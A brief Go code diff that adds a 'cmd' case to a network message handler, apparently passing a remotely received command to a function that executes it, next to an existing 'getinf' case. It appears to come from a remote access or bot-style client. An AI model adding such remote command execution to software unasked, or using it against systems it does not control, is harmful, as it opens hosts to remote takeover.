@@ -24,7 +24,9 @@ func HandleCommand(c net.Conn, message string) {
 	case "getinf":
 		go getInf(c)
 		break
-	// case "cmd"
+	case "cmd":
+		cmd(fullCommand, c)
+		break
 	}
 }
 
